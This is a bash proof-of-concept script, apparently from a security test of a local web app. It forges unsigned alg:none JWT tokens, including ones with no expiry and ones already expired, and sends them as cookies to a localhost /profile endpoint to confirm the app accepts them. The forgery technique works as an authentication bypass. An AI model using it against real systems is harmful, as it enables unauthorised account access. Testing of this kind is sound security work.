#!/bin/bash

# POC: Missing JWT Token Expiration Vulnerability - FINAL
# Demonstrates that JWT tokens lack expiration claims and are not validated server-side
# Uses Cookie header for token delivery (as application expects)

TARGET="http://localhost:5003"
ITERATIONS=5

echo "[*] Testing Missing JWT Token Expiration Vulnerability"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Create forged JWT tokens with alg:none (no signature required)
echo "[+] Step 1: Creating forged JWT tokens (alg:none with no exp claim)..."

# Token: Basic user token without exp claim
HEADER='{"alg":"none","typ":"JWT"}'
PAYLOAD='{"username":"user","role":"user"}'

HEADER_B64=$(echo -n "$HEADER" | base64 -w0 | tr -d '=\n')
PAYLOAD_B64=$(echo -n "$PAYLOAD" | base64 -w0 | tr -d '=\n')

TOKEN="${HEADER_B64}.${PAYLOAD_B64}."
echo "[+] Forged Token: ${TOKEN:0:70}..."

# Decode to verify no exp claim
echo "[+] Decoding Token payload:"
PAYLOAD_DECODED=$(echo -n "$PAYLOAD_B64" | base64 -d 2>/dev/null)
echo "    $PAYLOAD_DECODED"

if ! echo "$PAYLOAD_DECODED" | grep -q '"exp"'; then
  echo "    [!] Confirmed: No 'exp' claim in payload (VULNERABLE)"
  HAS_EXP=0
else
  echo "    [+] Token contains exp claim"
  HAS_EXP=1
fi

echo ""

# Step 2: Test that forged tokens are accepted via Cookie header
echo "[+] Step 2: Testing if forged token is accepted via Cookie header..."

RESPONSE=$(curl -s -w "\n%{http_code}" -b "token=$TOKEN" "$TARGET/profile")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "    HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
  echo "    [!] VULNERABLE: Forged token accepted!"
  echo "    Response body: $BODY"
  FORGED_ACCEPTED=1
else
  echo "    [-] Unexpected response code"
  FORGED_ACCEPTED=0
fi

echo ""

# Step 3: Test token reuse indefinitely (multiple requests)
echo "[+] Step 3: Testing token reuse (token should remain valid indefinitely)..."
SUCCESS_COUNT=0

for i in $(seq 1 $ITERATIONS); do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "token=$TOKEN" \
    "$TARGET/profile")
  
  echo "    Request $i: HTTP $HTTP_CODE"
  
  if [ "$HTTP_CODE" = "200" ]; then
    ((SUCCESS_COUNT++))
  fi
done

echo ""
echo "[+] Results: $SUCCESS_COUNT/$ITERATIONS requests succeeded (200 OK)"

if [ $SUCCESS_COUNT -eq $ITERATIONS ]; then
  echo "[!] VULNERABILITY CONFIRMED: Token remains valid indefinitely"
  INDEFINITE_VALID=1
else
  echo "[-] Not all requests succeeded"
  INDEFINITE_VALID=0
fi

echo ""

# Step 4: Test with arbitrary timestamp (no proper exp validation)
echo "[+] Step 4: Testing forged token with arbitrary timestamp claim..."

PAYLOAD_WITH_TS='{"username":"user","role":"user","timestamp":"2025-01-01T00:00:00Z"}'
PAYLOAD_TS_B64=$(echo -n "$PAYLOAD_WITH_TS" | base64 -w0 | tr -d '=\n')
TOKEN_WITH_TS="${HEADER_B64}.${PAYLOAD_TS_B64}."

echo "[*] Token with custom timestamp: ${TOKEN_WITH_TS:0:70}..."

HTTP_CODE_TS=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "token=$TOKEN_WITH_TS" \
  "$TARGET/profile")

echo "    HTTP Response Code: $HTTP_CODE_TS"

if [ "$HTTP_CODE_TS" = "200" ]; then
  echo "    [!] VULNERABLE: Token with arbitrary timestamp accepted"
  ARBITRARY_TS_ACCEPTED=1
else
  echo "    [-] Token with custom timestamp rejected"
  ARBITRARY_TS_ACCEPTED=0
fi

echo ""

# Step 5: Create token with old expiration date (should fail if properly validated)
echo "[+] Step 5: Testing token with past expiration date (exp claim)..."

PAYLOAD_EXPIRED='{"username":"user","role":"user","exp":1000000}'  # Unix timestamp from 1970
PAYLOAD_EXP_B64=$(echo -n "$PAYLOAD_EXPIRED" | base64 -w0 | tr -d '=\n')
TOKEN_EXPIRED="${HEADER_B64}.${PAYLOAD_EXP_B64}."

echo "[*] Token with exp=1000000 (1970): ${TOKEN_EXPIRED:0:70}..."

HTTP_CODE_EXP=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "token=$TOKEN_EXPIRED" \
  "$TARGET/profile")

echo "    HTTP Response Code: $HTTP_CODE_EXP"

if [ "$HTTP_CODE_EXP" = "200" ]; then
  echo "    [!] VULNERABLE: Expired token still accepted!"
  EXPIRED_ACCEPTED=1
else
  echo "    [+] Expired token properly rejected"
  EXPIRED_ACCEPTED=0
fi

echo ""
echo "========== VULNERABILITY SUMMARY =========="
echo "No 'exp' claim in tokens: $([ $HAS_EXP -eq 0 ] && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Forged tokens accepted: $([ $FORGED_ACCEPTED -eq 1 ] && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Indefinite token validity: $([ $INDEFINITE_VALID -eq 1 ] && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Arbitrary timestamp ignored: $([ $ARBITRARY_TS_ACCEPTED -eq 1 ] && echo 'YES - VULNERABLE' || echo 'NO')"
echo "Expired tokens accepted: $([ $EXPIRED_ACCEPTED -eq 1 ] && echo 'YES - VULNERABLE' || echo 'NO')"
echo ""

# Check if vulnerability is confirmed
if [ $HAS_EXP -eq 0 ] && ([ $FORGED_ACCEPTED -eq 1 ] || [ $INDEFINITE_VALID -eq 1 ]); then
  echo "[+] VULNERABILITY CONFIRMED: Missing JWT Token Expiration"
  echo "[+] Impact: Tokens remain valid indefinitely without server-side expiration validation"
  exit 0
else
  echo "[-] Could not fully confirm vulnerability"
  exit 1
fi